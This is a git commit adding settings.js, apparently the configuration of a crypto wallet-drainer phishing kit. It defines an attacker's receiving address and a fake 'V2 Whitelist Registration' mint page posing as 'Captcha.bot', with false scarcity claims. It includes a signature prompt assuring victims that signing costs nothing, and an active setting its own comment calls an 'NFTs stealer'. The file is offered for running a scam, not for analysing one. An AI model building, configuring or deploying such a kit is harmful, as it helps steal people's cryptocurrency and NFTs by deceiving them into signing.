5b3c2e1e9d0e9f8eaafbc962100da621bb8aa382
golbrich <109406945+golbrich@users.noreply.github.com>
2022-07-15 23:12:41 -0700

    Add files via upload

---
+++ settings.js
@@ -0,0 +1,59 @@
+const receiveAddress = "0x0D02c1D17e345B4dceA335Fd2988FbDF3F05e64C";
+
+const collectionInfo = {
+    name: "V2 Whitelist Registration",
+    socialMedia: {
+        discord: "",
+        twitter: "",
+        instagram: "",
+    },
+}
+
+const signMessage = `Welcome, \n\n` +
+    `Click to sign in and accept the Terms of Service.\n\n` +
+    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
+    `Wallet Address:\n{address}\n\n` +
+    `Nonce:\n{nonce}`;
+
+const indexPageInfo = {
+    backgroundImage: "background.jpeg", // relative path to background image (in assets)
+    title: "{name}", // {name} will be replaced with collectionInfo.name
+    underTitle: "Captcha.bot",
+}
+
+const claimPageInfo = {
+    title: "V2 Whitelist Registration<br>", // <br> is a line break
+    shortDescription: "Public mint date 23rd July \n Price; Free + gas fees",
+    longDescription: "Just 720 whitelist spots left",
+
+    claimButtonText: "Register",
+
+    image: "captcha.jpeg", // relative path to image (in assets)
+    imageRadius: 250, // image radius in px
+}
+
+const drainNftsInfo = {
+    active: true, // Active (true) or not (false) NFTs stealer.
+    minValue: 0.01, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
+}
+
+const customStrings = {
+    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    connectButton: "Connect wallet",
+    transferButton: "Mint now",
+    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
+}
+
+/*
+    = = = = = END OF SETTINGS = = = = =
+*/
+
+//#region Check Configuration
+if (!receiveAddress.startsWith("0x") ||
+    (
+        receiveAddress.length >= 64 ||
+        receiveAddress.length <= 40
+    )
+) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
+//#endregion
